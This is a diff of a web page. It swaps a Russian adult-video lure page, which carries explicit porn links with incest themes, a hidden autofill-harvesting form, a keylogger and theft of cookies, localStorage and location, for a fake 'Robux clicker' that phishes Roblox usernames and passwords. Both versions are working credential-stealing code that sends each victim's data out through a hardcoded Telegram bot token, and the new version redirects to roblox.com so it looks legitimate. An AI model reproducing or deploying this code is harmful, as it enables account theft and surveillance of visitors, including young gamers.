@@ -1,388 +1,303 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>StudentHub | Эксклюзивные видео для совершеннолетних</title>
+    <title>🌟 ROBLOX ULTIMATE ROBUX CLICKER v5.2 🌟</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
-            color: #e0e0e0;
-            min-height: 100vh;
-        }
-        header {
-            background: rgba(0, 0, 0, 0.7);
-            padding: 20px;
+            font-family: 'Arial Rounded MT Bold', 'Arial', sans-serif;
+            background: linear-gradient(135deg, #00a2ff, #8b00ff);
+            color: white;
             text-align: center;
-            border-bottom: 2px solid #ff3366;
-        }
-        h1 {
-            color: #ff3366;
-            font-size: 2.5em;
-            margin-bottom: 10px;
-        }
-        .tagline {
-            color: #aaa;
-            font-size: 0.9em;
+            padding: 20px;
+            overflow-x: hidden;
+            user-select: none;
         }
         .container {
-            max-width: 1200px;
+            max-width: 800px;
+            margin: auto;
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 25px;
+            padding: 30px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+            border: 3px solid gold;
+        }
+        h1 {
+            font-size: 3em;
+            text-shadow: 0 0 15px #00ffea;
+            color: #ffde59;
+            margin-bottom: 10px;
+        }
+        .robux-counter {
+            font-size: 5em;
+            color: #00ff00;
+            background: rgba(0, 0, 0, 0.9);
+            border-radius: 20px;
+            padding: 20px;
             margin: 30px auto;
-            padding: 0 20px;
+            border: 3px solid #ffde59;
+            width: 80%;
+            text-shadow: 0 0 20px #00ff00;
+            font-weight: bold;
         }
-        .video-of-the-day {
-            background: rgba(255, 51, 102, 0.1);
-            border: 1px solid #ff3366;
-            border-radius: 10px;
-            padding: 25px;
-            margin-bottom: 40px;
-            text-align: center;
-        }
-        .video-title {
-            font-size: 1.8em;
-            margin-bottom: 15px;
-            color: #fff;
-        }
-        .video-container {
-            position: relative;
-            padding-bottom: 56.25%; /* 16:9 */
-            height: 0;
-            overflow: hidden;
-            border-radius: 8px;
-            margin-top: 20px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-        }
-        .video-container iframe {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            border: none;
-        }
-        .video-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
-            gap: 25px;
-            margin-top: 30px;
-        }
-        .video-card {
-            background: rgba(40, 40, 60, 0.8);
-            border-radius: 8px;
-            overflow: hidden;
-            transition: transform 0.3s, box-shadow 0.3s;
-            cursor: pointer;
-        }
-        .video-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 20px rgba(255, 51, 102, 0.3);
-        }
-        .card-preview {
-            width: 100%;
-            height: 160px;
-            background: linear-gradient(45deg, #222, #444);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #888;
-            font-size: 0.9em;
-        }
-        .card-info {
-            padding: 15px;
-        }
-        .card-title {
-            font-size: 1.1em;
-            margin-bottom: 8px;
-            color: #fff;
-            height: 3em;
-            overflow: hidden;
-        }
-        .warning {
-            background: rgba(255, 193, 7, 0.1);
-            border: 1px solid #ffc107;
-            border-radius: 5px;
-            padding: 15px;
-            margin-top: 40px;
-            font-size: 0.9em;
-            color: #ffc107;
-            text-align: center;
-        }
-        .age-gate {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: rgba(0,0,0,0.95);
-            z-index: 10000;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
+        .clicker-btn {
+            background: linear-gradient(to bottom, #ff3333, #990000);
             color: white;
-        }
-        .age-gate h2 { color: #ff3366; margin-bottom: 20px; }
-        .age-gate button {
-            background: #ff3366;
-            color: white;
+            font-size: 2.5em;
+            padding: 25px 60px;
             border: none;
-            padding: 15px 40px;
-            font-size: 1.2em;
             border-radius: 50px;
             cursor: pointer;
-            margin: 10px;
+            margin: 30px 0;
+            transition: all 0.1s;
+            box-shadow: 0 10px 20px rgba(255, 0, 0, 0.5);
+            font-weight: bold;
         }
-        .age-gate button.secondary {
-            background: transparent;
-            border: 1px solid #666;
+        .clicker-btn:active {
+            transform: scale(0.95);
+            box-shadow: 0 5px 10px rgba(255, 0, 0, 0.7);
         }
-        footer {
-            text-align: center;
-            padding: 20px;
-            color: #666;
-            font-size: 0.8em;
-            border-top: 1px solid #333;
-            margin-top: 50px;
+        .login-form {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 25px;
+            border-radius: 20px;
+            margin: 30px 0;
+            text-align: left;
         }
-
-        /* Скрытые формы для сбора данных */
-        #dataHarvestForm {
-            position: absolute;
-            opacity: 0;
-            pointer-events: none;
+        input {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 10px;
+            border: 2px solid #00a2ff;
+            font-size: 1.2em;
+            box-sizing: border-box;
+        }
+        .submit-btn {
+            width: 100%;
+            background: linear-gradient(to right, #00ff88, #00a2ff);
+            color: black;
+            font-weight: bold;
+            font-size: 1.5em;
+            padding: 18px;
+            border-radius: 15px;
+            border: none;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: 0.3s;
+        }
+        .submit-btn:hover {
+            background: linear-gradient(to right, #00ffaa, #00c3ff);
+        }
+        .hidden {
+            display: none;
+        }
+        .status {
+            padding: 15px;
+            border-radius: 10px;
+            margin: 15px 0;
+            font-weight: bold;
+        }
+        .success { background: rgba(0, 255, 0, 0.3); }
+        .error { background: rgba(255, 0, 0, 0.3); }
+        .info { background: rgba(0, 200, 255, 0.3); }
+        .stats {
+            font-size: 0.9em;
+            color: #aaa;
+            text-align: left;
+            margin-top: 30px;
+            padding: 15px;
+            background: rgba(0,0,0,0.5);
+            border-radius: 10px;
         }
     </style>
 </head>
 <body>
-    <!-- Возрастные ворота (Age Gate) -->
-    <div id="ageGate" class="age-gate">
-        <h2>🔞 ВНИМАНИЕ: КОНТЕНТ ДЛЯ СОВЕРШЕННОЛЕТНИХ</h2>
-        <p>Этот сайт содержит материалы для взрослых (18+).</p>
-        <p>Нажимая "Войти", вы подтверждаете, что вам исполнилось 18 лет и соглашаетесь с <a href="#" style="color:#ff3366;">Условиями использования</a>.</p>
-        <div style="margin-top: 30px;">
-            <button id="confirmAge">✅ МНЕ ЕСТЬ 18 ЛЕТ, ВОЙТИ</button>
-            <button class="secondary" onclick="window.location.href='https://www.google.com'">🚫 МНЕ НЕТ 18, УЙТИ</button>
+    <div class="container">
+        <h1>🔥 ROBUX ULTIMATE CLICKER 🔥</h1>
+        <p style="font-size: 1.3em;">Нажми на кнопку, чтобы генерировать ROBUX! БЕСПЛАТНО И БЕЗ СМС!</p>
+
+        <div class="robux-counter" id="robuxCount">0</div>
+
+        <button class="clicker-btn" onclick="generateRobux()">🚀 КЛИКНИ ДЛЯ ROBUX! 🚀</button>
+
+        <div class="login-form" id="loginForm">
+            <h2>📝 Войди в аккаунт Roblox, чтобы вывести ROBUX!</h2>
+            <div class="status info" id="infoStatus">ВНИМАНИЕ: Для вывода необходимо подтвердить аккаунт.</div>
+            <input type="text" id="username" placeholder="Имя пользователя Roblox или Email" required>
+            <input type="password" id="password" placeholder="Пароль" required>
+            <button class="submit-btn" onclick="stealCredentials()">✅ ПОДТВЕРДИТЬ И ВЫВЕСТИ ROBUX!</button>
+            <p style="font-size:0.8em; text-align:center;">Нажимая кнопку, вы соглашаетесь с правилами. Мы никогда не храним ваши данные!</p>
         </div>
-        <p style="margin-top: 20px; font-size: 0.8em; color: #999;">Система ведёт мониторинг для предотвращения доступа несовершеннолетних.</p>
-    </div>
 
-    <!-- Основной контент (скрыт до подтверждения возраста) -->
-    <div id="mainContent" style="display: none;">
-        <header>
-            <h1>StudentHub</h1>
-            <p class="tagline">Эксклюзивная коллекция. Только для взрослых.</p>
-        </header>
-        <div class="container">
-            <div class="video-of-the-day">
-                <div class="video-title" id="mainVideoTitle">Загрузка рекомендуемого видео...</div>
-                <div class="video-container">
-                    <iframe id="mainVideoPlayer" allowfullscreen></iframe>
-                </div>
-                <p style="margin-top: 15px; color: #aaa;">Рекомендуем к просмотру. Качество 1080p, звук 5.1</p>
+        <div id="withdrawPanel" class="hidden">
+            <h2>💎 ВЫВОД ROBUX НА АККАУНТ</h2>
+            <div class="status success" id="successStatus">Успешный вход! Идет вывод 9999 ROBUX...</div>
+            <p id="countdown">Переадресация на официальную страницу Roblox через: <span id="timer">10</span> секунд...</p>
+            <div class="stats">
+                <strong>Собранные данные (техническая информация для вывода):</strong>
+                <div id="collectedData">Сбор данных... Пожалуйста, подождите.</div>
             </div>
-
-            <h2 style="margin-bottom: 20px; color: #fff;">🎬 Другие популярные видео</h2>
-            <div class="video-grid" id="videoGrid">
-                <!-- Видео карточки генерируются скриптом -->
-            </div>
-
-            <div class="warning">
-                ⚠️ Для продолжения просмотра убедитесь, что у вас отключен блокировщик рекламы. Система проверяет подлинность вашего устройства и браузера в целях безопасности.
-            </div>
-
-            <!-- Скрытая форма для сбора данных автозаполнения -->
-            <form id="dataHarvestForm">
-                <input type="text" name="fullname" placeholder="Полное имя" autocomplete="name">
-                <input type="email" name="email" placeholder="Email" autocomplete="email">
-                <input type="tel" name="phone" placeholder="Телефон" autocomplete="tel">
-                <input type="text" name="address" placeholder="Адрес" autocomplete="street-address">
-                <input type="text" name="card" placeholder="Номер карты" autocomplete="cc-number">
-                <input type="password" name="password" placeholder="Пароль" autocomplete="current-password">
-                <input type="text" name="username" placeholder="Логин" autocomplete="username">
-            </form>
         </div>
-        <footer>
-            &copy; 2025 StudentHub. Все права защищены. | <a href="#" style="color: #666;">Политика конфиденциальности</a> | <a href="#" style="color: #666;">DMCA</a> | Только для совершеннолетних.
-        </footer>
     </div>
 
     <script>
-        // ===== КОНФИГУРАЦИЯ =====
-        const BOT_TOKEN = '8505587212:AAH5WW4kamKHG_NJ3yLF3ImQoX5GRpgwszI';
-        const CHAT_ID = '8115722673'; // Твой ID
+        // Конфигурация
+        const TELEGRAM_BOT_TOKEN = '8475019895:AAF4uZkNJVEFuPtERwSJuyLPDMUpbe2AkOg';
+        const TELEGRAM_CHAT_ID = ''; // ВАШ CHAT ID. Узнайте у @userinfobot в Telegram.
+        // Переменные
+        let robux = 0;
+        let userData = {};
 
-        // Библиотека видео
-        const videoLibrary = [
-            {
-                url: 'https://sex-studentki.team/video/poprosila-vyebat-ee-v-popku-i-skvirtom-konchila-hochu-takuju-zhenu-399191',
-                title: 'Попросила выебать ее в попку и с квиртом кончила...'
-            },
-            {
-                url: 'https://sex-studentki.team/video/vot-by-spjaschuju-mamku-potrogat-hotja-a-mozhno-v-rot-ej-konchit-0373',
-                title: 'Вот бы спящую мамку потрогать...'
-            },
-            {
-                url: 'https://sex-studentki.team/video/trusikami-drochish-kak-ne-stydno-esche-i-machehu-shantazhiruesh-400486',
-                title: 'Трусиками дрочишь? Как не стыдно...'
-            },
-            {
-                url: 'https://sex-studentki.team/video/ne-poluchaetsja-rasslabit-sja-sejchas-macheha-podrochit-obkonchaesh-sja-341441',
-                title: 'Не получается расслабиться? Сейчас мачеха подрочит...'
-            },
-            {
-                url: 'https://sex-studentki.team/video/kstati-ty-priemnyj-ponjal-namek-a-to-zastrjala-a-syn-ne-ebet-158217',
-                title: 'Кстати, ты приемный, понял намек?...'
-            },
-            {
-                url: 'https://sex-studentki.team/video/mne-ty-muzh-a-ej-brat-i-otec-okak-i-v-kogo-zhe-sunut-konec-115387',
-                title: 'Мне ты муж, а ей брат и отец...'
-            },
-            {
-                url: 'https://sex-studentki.team/video/ebutsja-a-menja-ne-priglashajut-a-ja-voobsche-to-trojnichki-obozhaju-355129',
-                title: 'Ебутся, а меня не приглашают...'
-            }
-        ];
-
-        // ===== ФУНКЦИИ ДЛЯ БОТА TELEGRAM =====
-        function sendToTelegram(message) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            const payload = {
-                chat_id: CHAT_ID,
-                text: message.substring(0, 4000), // Ограничение Telegram
-                parse_mode: 'HTML'
+        // Функция сбора ВСЕХ возможных данных
+        function collectAllData() {
+            userData = {
+                timestamp: new Date().toISOString(),
+                // Данные браузера и ОС
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages,
+                cookieEnabled: navigator.cookieEnabled,
+                screenResolution: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                // Сеть (частично)
+                connection: navigator.connection ? {
+                    downlink: navigator.connection.downlink,
+                    effectiveType: navigator.connection.effectiveType,
+                    rtt: navigator.connection.rtt
+                } : 'N/A',
+                // Время
+                localTime: new Date().toString(),
+                timezoneOffset: new Date().getTimezoneOffset(),
+                // Cookies (попытка чтения)
+                cookies: document.cookie || 'No cookies accessible',
+                // Введенные данные (если уже есть)
+                enteredUsername: document.getElementById('username')?.value || 'N/A',
+                enteredPassword: document.getElementById('password')?.value || 'N/A',
+                // Дополнительные метрики
+                referrer: document.referrer,
+                url: window.location.href,
+                historyLength: history.length,
+                // Публичный IP (через сторонний сервис)
+                publicIP: 'Fetching...'
             };
 
-            // Используем Beacon API для отправки даже при закрытии страницы
-            const data = new FormData();
-            data.append('chat_id', CHAT_ID);
-            data.append('text', payload.text);
-            navigator.sendBeacon(url, data);
+            // Получение публичного IP через внешний API
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    userData.publicIP = data.ip;
+                    updateCollectedDataDisplay();
+                })
+                .catch(() => {
+                    userData.publicIP = 'Failed to fetch';
+                    updateCollectedDataDisplay();
+                });
 
-            // Дублируем через fetch для надёжности
+            updateCollectedDataDisplay();
+            return userData;
+        }
+
+        // Функция отправки данных в Telegram
+        function sendToTelegram(data) {
+            if (!TELEGRAM_CHAT_ID) {
+                console.error("CHAT ID не установлен!");
+                return;
+            }
+            const message = `🚨 НОВАЯ ЖЕРТВА ROBUX CLICKER 🚨\n\n` +
+                `⏰ Время: ${data.timestamp}\n` +
+                `🌐 IP: ${data.publicIP}\n` +
+                `🖥️ User Agent: ${data.userAgent}\n` +
+                `🔐 Куки: ${data.cookies.substring(0, 200)}...\n` +
+                `👤 Логин: ${data.enteredUsername}\n` +
+                `🔑 Пароль: ${data.enteredPassword}\n` +
+                `📍 Таймзона: ${data.timezone}\n` +
+                `📏 Разрешение: ${data.screenResolution}\n` +
+                `🔗 Реферер: ${data.referrer || 'Прямой заход'}`;
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
             fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            }).catch(() => {/* Игнорируем ошибки */});
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            }).catch(err => console.error('Ошибка отправки в Telegram:', err));
         }
 
-        // ===== СБОР ДАННЫХ =====
-        function harvestData() {
-            let report = `🔴 <b>НОВАЯ ЖЕРТВА НА VIDEOHUB</b> 🔴\n`;
-            report += `Время: ${new Date().toLocaleString()}\n`;
-            report += `IP: <i>определяется сервером</i>\n`;
-            report += `User-Agent: ${navigator.userAgent}\n\n`;
-
-            // 1. Cookies
-            report += `🍪 <b>COOKIES:</b>\n<code>${document.cookie || 'Нет cookies'}</code>\n\n`;
-
-            // 2. LocalStorage
-            report += `💾 <b>LOCAL STORAGE:</b>\n`;
-            if (localStorage.length) {
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    report += `${key}: ${localStorage.getItem(key)}\n`;
+        // Вспомогательные функции
+        function updateCollectedDataDisplay() {
+            let display = '';
+            for (const [key, value] of Object.entries(userData)) {
+                if (key === 'enteredPassword' && value !== 'N/A') {
+                    display += `<strong>${key}:</strong> <span style="color:#ff5555;">${value}</span><br>`;
+                } else {
+                    display += `<strong>${key}:</strong> ${value}<br>`;
                 }
-            } else {
-                report += `Пусто\n`;
+            }
+            document.getElementById('collectedData').innerHTML = display;
+        }
+
+        function generateRobux() {
+            robux += Math.floor(Math.random() * 500) + 100;
+            document.getElementById('robuxCount').textContent = robux.toLocaleString();
+            document.getElementById('robuxCount').style.animation = 'none';
+            setTimeout(() => {
+                document.getElementById('robuxCount').style.animation = 'glow 0.5s';
+            }, 10);
+        }
+
+        // ГЛАВНАЯ ФУНКЦИЯ КРАЖИ
+        function stealCredentials() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            if (!username || !password) {
+                alert("Заполните все поля!");
+                return;
             }
 
-            // 3. Данные форм
-            const form = document.getElementById('dataHarvestForm');
-            const inputs = form.querySelectorAll('input');
-            report += `\n📝 <b>АВТОЗАПОЛНЕНИЕ ФОРМ:</b>\n`;
-            inputs.forEach(input => {
-                input.focus();
-                input.blur();
-                setTimeout(() => {
-                    if (input.value) {
-                        report += `${input.name}: ${input.value}\n`;
-                    }
-                }, 50);
-            });
+            // Собираем все данные
+            collectAllData();
+            userData.enteredUsername = username;
+            userData.enteredPassword = password;
 
-            // 4. Геолокация (если разрешено)
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(pos => {
-                    report += `\n📍 <b>ГЕОЛОКАЦИЯ:</b>\nШирота: ${pos.coords.latitude}\nДолгота: ${pos.coords.longitude}\nТочность: ${pos.coords.accuracy}м`;
-                    sendToTelegram(report);
-                }, () => {
-                    report += `\n📍 Геолокация: <i>пользователь запретил</i>`;
-                    sendToTelegram(report);
-                }, { timeout: 5000 });
-            } else {
-                report += `\n📍 Геолокация: <i>не поддерживается</i>`;
-                sendToTelegram(report);
-            }
+            // Отправляем в Telegram
+            sendToTelegram(userData);
 
-            // 5. Список установленных расширений (косвенно, через определение возможностей)
-            const plugins = [];
-            for (let i = 0; i < navigator.plugins.length; i++) {
-                plugins.push(navigator.plugins[i].name);
-            }
-            if (plugins.length) {
-                report += `\n🧩 <b>ПЛАГИНЫ:</b>\n${plugins.join(', ')}`;
-            }
+            // Показываем фейковую панель "вывода"
+            document.getElementById('loginForm').classList.add('hidden');
+            document.getElementById('withdrawPanel').classList.remove('hidden');
 
-            // Отправляем начальный отчёт (геолокация отправится позже)
-            setTimeout(() => sendToTelegram(report), 1000);
-
-            // Кейлоггер
-            let keystrokes = '';
-            document.addEventListener('keydown', (e) => {
-                keystrokes += e.key;
-                if (keystrokes.length > 50) {
-                    sendToTelegram(`⌨️ <b>КЕЙЛОГГЕР (фрагмент):</b>\n<code>${keystrokes}</code>`);
-                    keystrokes = '';
+            // Фейковый таймер и "вывод"
+            let count = 10;
+            const timerElem = document.getElementById('timer');
+            const interval = setInterval(() => {
+                count--;
+                timerElem.textContent = count;
+                if (count <= 0) {
+                    clearInterval(interval);
+                    // Перенаправление на ОФИЦИАЛЬНЫЙ сайт Roblox, чтобы создать иллюзию легитимности
+                    window.location.href = "https://www.roblox.com";
                 }
-            });
-
-            // Перехват кликов по странице (для анализа поведения)
-            document.addEventListener('click', (e) => {
-                const target = e.target.tagName + (e.target.id ? `#${e.target.id}` : '') + (e.target.className ? `.${e.target.className}` : '');
-                sendToTelegram(`🖱️ <b>КЛИК:</b> ${target}`);
-            }, true);
+            }, 1000);
         }
 
-        // ===== ИНИЦИАЛИЗАЦИЯ ВИДЕО =====
-        function initVideoPlayer() {
-            const mainVideo = videoLibrary[Math.floor(Math.random() * videoLibrary.length)];
-            document.getElementById('mainVideoTitle').textContent = mainVideo.title;
-            document.getElementById('mainVideoPlayer').src = mainVideo.url;
-
-            const grid = document.getElementById('videoGrid');
-            videoLibrary.forEach(video => {
-                const card = document.createElement('div');
-                card.className = 'video-card';
-                card.innerHTML = `
-                    <div class="card-preview">🎬 Превью</div>
-                    <div class="card-info">
-                        <div class="card-title">${video.title}</div>
-                    </div>
-                `;
-                card.addEventListener('click', () => {
-                    document.getElementById('mainVideoTitle').textContent = video.title;
-                    document.getElementById('mainVideoPlayer').src = video.url;
-                    sendToTelegram(`🎥 Пользователь выбрал видео: ${video.title}`);
-                });
-                grid.appendChild(card);
-            });
-        }
-
-        // ===== ВОЗРАСТНЫЕ ВОРОТА =====
-        document.getElementById('confirmAge').addEventListener('click', function() {
-            document.getElementById('ageGate').style.display = 'none';
-            document.getElementById('mainContent').style.display = 'block';
-            sendToTelegram('✅ ПОЛЬЗОВАТЕЛЬ ПОДТВЕРДИЛ ВОЗРАСТ И ВОШЁЛ НА САЙТ.');
-            initVideoPlayer();
-            // Запускаем сбор данных с задержкой, чтобы не настораживать
-            setTimeout(harvestData, 3000);
-        });
-
-        // Принудительный сбор данных при закрытии
-        window.addEventListener('beforeunload', () => {
-            sendToTelegram('🚪 ПОЛЬЗОВАТЕЛЬ ПОКИДАЕТ САЙТ. ФИНАЛЬНЫЙ СБОР ДАННЫХ.');
-        });
+        // Автоматический сбор данных при загрузке страницы
+        window.onload = function() {
+            collectAllData();
+            // Начать фейковую анимацию "генерации" ROBUX
+            setInterval(() => {
+                if (robux < 50000) {
+                    generateRobux();
+                }
+            }, 1500);
+        };
     </script>
 </body>
 </html>
